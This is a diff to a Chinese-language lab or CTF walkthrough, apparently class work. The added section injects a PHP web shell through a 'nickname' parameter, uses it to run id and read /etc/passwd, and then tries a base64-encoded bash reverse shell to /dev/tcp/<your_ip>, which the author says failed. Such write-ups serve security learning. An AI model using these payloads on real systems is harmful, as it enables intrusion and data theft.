@@ -87,4 +87,35 @@ Export看看
 
 ![image](https://github.com/TwMoonBear-Arsenal/Pub-ClassWork/assets/25276693/a383f1ac-1d78-4b6c-9370-07ef8042960c)
 
-#未完
+![image](https://github.com/FromSouth/Pub-ClassWork/assets/25276693/dfebe736-97dc-4efd-98e2-2a5a32664b84)
+
+回到backup裡面，發現裡面有一個authenticate.php
+
+![image](https://github.com/FromSouth/Pub-ClassWork/assets/25276693/01ad81f3-7434-452b-8ad0-2919d8f3f34c)
+
+發現還有一個parameter叫做"Nickname"可以用
+
+試試看能不能做shell出來  
+
+> &nickname=<%3fphp+system($_GET['cmd'])+%3f>
+
+> <file_name>.php?cmd=id
+
+![image](https://github.com/FromSouth/Pub-ClassWork/assets/25276693/78c9d1e2-d470-41a1-b3f6-fd07c82d1aa5)
+
+> <file_name>.php?cmd=cat /etc/passwd
+
+![image](https://github.com/FromSouth/Pub-ClassWork/assets/25276693/85cf53a7-5c55-4e98-8239-6414e343e908)
+
+這裡面要特別注意的是密碼除了root以外
+
+還有一個用戶叫做jack
+
+## Reverse Shell
+
+> echo "sh -i >& /dev/tcp/<your_ip>/9001 0>&1" | base64
+> echo%20%22<your_reverse_shell>%22%20|%20base64%20-d%20|%20bash
+
+![image](https://github.com/FromSouth/Pub-ClassWork/assets/25276693/52a2cf43-a357-4eeb-b3fa-15ed5758aa28)
+
+Reverse shell 壞了，我不能理解
